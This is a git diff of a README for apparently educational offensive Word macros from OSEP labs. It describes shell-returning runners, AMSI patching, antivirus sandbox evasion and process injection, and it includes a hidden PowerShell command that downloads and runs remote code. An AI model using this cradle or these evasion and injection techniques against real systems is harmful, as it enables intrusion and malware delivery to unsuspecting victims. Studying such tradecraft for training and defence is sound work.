@@ -20,7 +20,7 @@
 ## `WordMacroRunner.vbs`
 This is a baseline runner that will return a shell from WINWORD.exe. Has capabilities to detect AMSI and patch it if found (for both 32-bit and 64 bit) as well as contains shellcode for both 32-bit and 64 bit Word so it can execute after detecting architecture. 
 
-The only apparent obfuscation on the shellcode itself is that its written in an integer array, no encoding/encrypting. Uses sleep calls to determine if being simulated by AV. Also makes sure the target is in the `192.168.0.0/16` IP range.
+The only apparent obfuscation on the shellcode itself is that its written in an integer array, no encoding/encrypting. Uses sleep calls to determine if being simulated by AV. Also has functionality to make sure the target is in the `192.168.0.0/16` IP range, except you have to uncomment it.
 
 ## `WordMacroRunnerBasic.vbs`
 This is just a basic version of `WordMacroRunner.vbs` without AMSI Bypass or IP Check.
@@ -37,18 +37,18 @@ powershell -exec bypass -nop -w hidden -c iex(new-object net.webclient).download
 ```
 
 ## `WordMacroInject.vbs`
-This macro performs process injection.  Currently injects into  `explorer.exe` in 64-bit word, and `WINWORD.exe` in 32-bit Word. Migration should be performed ASAP before Microsoft Word is closed by the victim if run on 32-bit. 
+This macro performs process injection from both 32-bit and 64-bit Word processes. In 64-bit processes, it injects into `explorer.exe`, but this is easily configurable with a single variable.
 
-Uses sleep calls to determine if being simulated by AV. The shellcode is not obfuscated at all, that is left up to the reader.
+In 32-bit processes, it enumerates running processes and attempts to find another 32-bit process to inject into. These are pretty sparse, but often times processes like `GoogleUpdate.exe`, `OneDrive.exe` are running as 32-bit (at least in the OSEP labs). If it can't find another 32-bit process, it injects into itself (`WINWORD.exe`).
+
+Uses a `sleep` call to determine if being simulated by AV. The shellcode is not obfuscated at all, that is left up to the reader. Much more can be done to obfuscate the entire script but if I did that here it would be hard to even understand the script, which would defeat its educational purpose.
 
 ### Notes
-*This runner is really only stable for 64-bit word*, because of the lack of suitable 32-bit injection targets on a 64-bit OS.  Seeing as we have no idea what version of word an organization will be running, the use case for this is limited. 
 
-> Starting in Word 2019 the program is 64 bit by default. This means Word 2019,O365,2021 are all good candidates for Injection because Orgs/individuals would have to go out of their way to have downloaded the 32 bit one.
+If Word (and thus our Macro) is ran in 32-bit mode, we have to find another 32-bit process to inject into because 32 bit processes cannot easily inject into 64 bit ones. The presumed typical target environment will be running 32 bit word on a 64 bit OS, which renders the injection into explorer impossible.
 
-*The issue stems from the fact that 32 bit processes cannot easily inject into 64 bit ones*. The presumed typical target environment will be running 32 bit word on a 64 bit OS, which renders the injection into explorer impossible.
+Starting in Word 2019 the program is 64 bit by default. This means Word 2019,O365,2021 are all good candidates for Injection because Orgs/individuals would have to go out of their way to have downloaded the 32 bit one.
 
-There are advanced techniques out there that might be able to facilitate this (*Heaven's gate*) but no idea if they could be implemented in VBA. Additionally there is no telling what/if any other 32 bit processes suitable for injection might be running on a target machine, other than `WINWORD.exe` at least momentarily.
+There are some more advanced techniques out there that might be able to facilitate 32&rarr;64 bit injection (*Heaven's gate*) but no idea if they could be implemented in VBA.
 
-In theory code could be written to enumerate running 32 bit processes and then just try to inject into an arbitrary one, but there are obvious issues concerning stability, and longevity of the process to maintain a reverse shell.  In reality just using a non-injecting runner and then setting up a C2 to automigrate is probably best practice as they are equipped to do so.
-
+As always, there are issues concerning stability, and longevity of the process to maintain a reverse shell when we inject into random processes. In reality just using a non-injecting runner and then setting up a C2 to automigrate is probably best practice as they are equipped to do so.
